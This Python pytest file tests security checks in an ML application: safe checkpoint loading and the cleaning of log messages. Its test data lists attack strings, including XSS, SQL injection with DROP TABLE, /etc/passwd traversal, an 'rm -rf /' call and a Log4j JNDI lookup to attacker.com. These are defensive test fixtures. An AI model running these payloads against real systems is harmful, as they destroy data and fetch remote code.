"""Security tests for ML models and text processing - FIXED VERSION."""

import json
from unittest.mock import patch

import pytest
import torch

from app.infrastructure.ml.models.base import BaseMLModel, ModelSecurityError
from app.infrastructure.ml.preprocessing.text_processor import (
    LogTextProcessor,
)


class TestModel(BaseMLModel):
    """Test model for security testing."""

    def __init__(self):
        super().__init__("TestModel", "1.0.0")
        self.linear = torch.nn.Linear(10, 5)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return self.linear(x)

    def get_model_info(self):
        return {"test": True}


class TestModelSecurity:
    """Тесты безопасности для загрузки моделей."""

    def test_secure_checkpoint_save_load(self, tmp_path):
        """Тест безопасного сохранения и загрузки модели."""
        model = TestModel()
        checkpoint_path = tmp_path / "test_model.pt"

        # Сохранение
        model.save_checkpoint(checkpoint_path, {"test_meta": "value"})
        assert checkpoint_path.exists()

        # Загрузка с использованием safe_globals context
        new_model = TestModel()
        metadata = new_model.load_checkpoint(checkpoint_path)

        assert metadata["test_meta"] == "value"
        assert new_model.model_name == "TestModel"
        assert new_model._model_hash is not None

    def test_file_extension_validation(self, tmp_path):
        """Тест валидации расширения файла."""
        model = TestModel()
        invalid_path = tmp_path / "model.txt"
        invalid_path.write_text("fake model")

        with pytest.raises(ModelSecurityError, match="Unsupported file extension"):
            model.load_checkpoint(invalid_path)

    def test_file_size_limit(self, tmp_path):
        """Тест ограничения размера файла."""
        model = TestModel()
        large_file = tmp_path / "large_model.pt"

        # Создание файла больше лимита
        with patch.object(BaseMLModel, "MAX_FILE_SIZE", 100):  # 100 bytes limit
            large_file.write_bytes(b"x" * 200)  # 200 bytes

            with pytest.raises(ModelSecurityError, match="Model file too large"):
                model.load_checkpoint(large_file)

    def test_integrity_check_with_hash(self, tmp_path):
        """Тест проверки целостности с хешем."""
        model = TestModel()
        checkpoint_path = tmp_path / "test_model.pt"

        # Сохранение
        model.save_checkpoint(checkpoint_path)

        # Получение хеша файла
        from app.infrastructure.ml.models.base import BaseMLModel

        file_hash = BaseMLModel._calculate_file_hash(model, checkpoint_path)

        # Загрузка с правильным хешем
        new_model = TestModel()
        new_model.load_checkpoint(checkpoint_path, expected_hash=file_hash)

        # Загрузка с неправильным хешем
        with pytest.raises(ModelSecurityError, match="File integrity check failed"):
            another_model = TestModel()
            another_model.load_checkpoint(checkpoint_path, expected_hash="wrong_hash")

    def test_weights_only_loading(self, tmp_path):
        """Тест что используется weights_only=True."""
        model = TestModel()
        checkpoint_path = tmp_path / "test_model.pt"

        # Создаем реальный checkpoint для тестирования
        model.save_checkpoint(checkpoint_path)

        # Мокируем torch.load для проверки параметров
        with patch("torch.load", wraps=torch.load) as mock_load:
            # Мокируем safe_globals context manager
            with patch("torch.serialization.safe_globals") as mock_safe_globals:
                mock_safe_globals.return_value.__enter__ = lambda x: None
                mock_safe_globals.return_value.__exit__ = lambda x, y, z, w: None

                try:
                    new_model = TestModel()
                    new_model.load_checkpoint(checkpoint_path)
                except Exception:
                    pass  # Может быть ошибка из-за мока

                # Проверяем что torch.load вызван с weights_only=True
                mock_load.assert_called()
                call_args = mock_load.call_args
                assert call_args[1]["weights_only"] is True


class TestTextProcessorSecurity:
    """Тесты безопасности для обработки текста."""

    def test_json_vocabulary_save_load(self, tmp_path):
        """Тест безопасного сохранения/загрузки vocabulary через JSON."""
        processor = LogTextProcessor(max_vocab_size=100)

        # Создание тестового vocabulary
        test_messages = [
            "INFO Application started successfully",
            "ERROR Database connection failed",
            "WARNING Memory usage high",
        ]
        processor.build_vocabulary(test_messages)

        vocab_path = tmp_path / "vocab.json"

        # Сохранение
        processor.save_vocabulary(vocab_path)
        assert vocab_path.exists()

        # Проверка что это валидный JSON
        with open(vocab_path) as f:
            vocab_data = json.load(f)

        assert "word_to_idx" in vocab_data
        assert "metadata" in vocab_data

        # Загрузка в новый процессор
        new_processor = LogTextProcessor()
        new_processor.load_vocabulary(vocab_path)

        assert new_processor.vocab_size == processor.vocab_size
        assert new_processor.word_to_idx == processor.word_to_idx

    def test_malicious_message_cleaning(self):
        """Тест очистки вредоносных сообщений."""
        processor = LogTextProcessor()

        # Тестовые вредоносные сообщения
        malicious_messages = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval(malicious_code)",
            "SELECT * FROM users; DROP TABLE users;",
            "../../../../etc/passwd",
            "a" * 20000,  # Очень длинное сообщение
        ]

        for message in malicious_messages:
            cleaned = processor.clean_log_message(message)

            # Проверяем что опасные паттерны удалены (исправленная версия)
            assert "script" not in cleaned.lower()  # Убираем < и >
            assert "javascript" not in cleaned.lower()  # Убираем :
            assert "eval" not in cleaned.lower()
            assert len(cleaned) <= 10000  # Ограничение длины

    def test_dos_protection(self):
        """Тест защиты от DoS атак."""
        processor = LogTextProcessor()

        # Тест с очень большим количеством сообщений
        large_dataset = [
            "test message"
        ] * 1_500_000  # Больше 1M для срабатывания warning

        # Должно обрабатываться без ошибок благодаря батчингу
        with patch(
            "app.infrastructure.ml.preprocessing.text_processor.logger"
        ) as mock_logger:
            # Передаем ВЕСЬ большой датасет, а не обрезанный
            processor.build_vocabulary(
                large_dataset
            )  # Полный датасет для срабатывания warning

            # Проверяем что логируются предупреждения о больших датасетах
            mock_logger.warning.assert_called()


# Параметризованные тесты для различных атак - ИСПРАВЛЕННАЯ ВЕРСИЯ
@pytest.mark.parametrize(
    "attack_vector",
    [
        "../../../../etc/passwd",
        "<script>alert('xss')</script>",
        "javascript:void(0)",
        "data:text/html,<script>alert(1)</script>",
        "eval(malicious_code)",
        "exec(rm -rf /)",
        "__import__('os').system('rm -rf /')",
        "file:///etc/passwd",
        "${jndi:ldap://attacker.com/a}",  # Log4j style
        "SELECT * FROM users WHERE '1'='1';DROP TABLE users;--",
    ],
)
def test_attack_vectors(attack_vector):
    """Тест защиты от различных векторов атак."""
    processor = LogTextProcessor()

    # Все атаки должны быть нейтрализованы
    cleaned = processor.clean_log_message(attack_vector)

    # Проверяем что опасные паттерны удалены/заменены (обновленные проверки)
    dangerous_patterns = [
        "script",  # Убираем < и > из проверки, так как они заменяются
        "javascript",  # Убираем : из проверки
        "eval",  # Убираем ( из проверки
        "exec",  # Убираем ( из проверки
        "import",  # Убираем __ из проверки
        "file",  # Убираем :// из проверки
        "drop",  # Разделяем DROP TABLE на отдельные слова
        "table",
        "select",  # Убираем * из проверки
        "jndi",  # Убираем ${ из проверки
    ]

    for pattern in dangerous_patterns:
        assert (
            pattern.lower() not in cleaned.lower()
        ), f"Pattern '{pattern}' found in cleaned message: {cleaned}"
